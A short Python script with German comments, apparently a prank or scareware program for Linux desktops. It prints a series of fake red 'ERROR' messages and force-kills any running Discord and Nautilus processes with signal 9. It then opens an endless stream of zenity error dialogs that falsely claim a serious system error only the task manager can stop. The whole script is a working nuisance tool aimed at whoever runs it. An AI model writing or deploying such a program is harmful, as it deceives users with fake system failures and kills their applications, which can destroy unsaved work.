import threading
import time
import os
import subprocess

def kill_process(process_name):
    # Alle Prozesse durchsuchen und den gewünschten Prozess beenden
    try:
        # `ps aux` gibt eine Liste aller Prozesse aus
        result = subprocess.check_output(["ps", "aux"])
        for line in result.decode().splitlines():
            if process_name.lower() in line.lower():
                pid = int(line.split()[1])
                print(f"Beende {process_name} mit PID {pid}")
                os.kill(pid, 9)  # Signal 9 beendet den Prozess sofort
    except Exception as e:
        print(f"Fehler beim Beenden des Prozesses: {e}")

def endless_error_dialog():
    while True:
        # Verwende Zenity, um einen Fehlerdialog anzuzeigen
        subprocess.run(["zenity", "--error", "--text", "Ein schwerwiegender Systemfehler ist aufgetreten!\nNur der Task-Manager kann dies beenden."])
        time.sleep(0.1)

def keep_terminal_open():
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    # 1) Begrüßung in der Konsole
    print("Hallo")
    time.sleep(2)
    print("Bitte warte einen Moment...")

    # 2) Warte 5 Sekunden
    time.sleep(5)

    # 3) Fehlertext in Rot in der Konsole
    print("\033[31mERROR 1\033[0m")
    time.sleep(2)
    print("\033[31mERROR 2\033[0m")
    time.sleep(2)
    print("\033[31mERROR 3\033[0m")
    time.sleep(2)
    print("\033[31mERROR 4\033[0m")
    time.sleep(2)
    print("\033[31mERROR 5\033[0m")
    time.sleep(2)
    print("\033[31mERROR 6\033[0m")
    time.sleep(2)
    print("\033[31mERROR 7\033[0m")
    time.sleep(2)
    print("\033[31mERROR 8\033[0m")
    time.sleep(2)

    # 4) Beende Discord und Explorer
    kill_process("discord")  # Discord schließen
    kill_process("nautilus")  # Nautilus (File Explorer) schließen

    # 5) Starte die unendlichen Fehler-Dialoge in einem Daemon-Thread
    t = threading.Thread(target=endless_error_dialog, daemon=True)
    t.start()

    # 6) Konsole offen halten
    keep_terminal_open()
